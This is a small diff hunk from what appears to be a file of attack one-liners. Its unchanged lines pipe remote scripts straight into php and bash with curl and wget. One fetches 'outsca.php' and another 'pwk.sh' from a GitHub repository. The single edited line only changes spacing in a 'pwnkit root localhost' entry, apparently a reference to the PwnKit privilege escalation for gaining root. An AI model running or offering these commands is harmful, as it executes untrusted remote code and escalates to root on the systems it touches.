@@ -10,6 +10,6 @@ curl -s https://example.com/script.php | php - backup y
 
 curl -s https://raw.githubusercontent.com/heck221/fungsiini/refs/heads/main/outsca.php | php
 
-4,pwnkit root localhost
+4, pwnkit root localhost
 
 wget https://raw.githubusercontent.com/heck221/fungsiini/refs/heads/main/pwk.sh -q -O - |bash
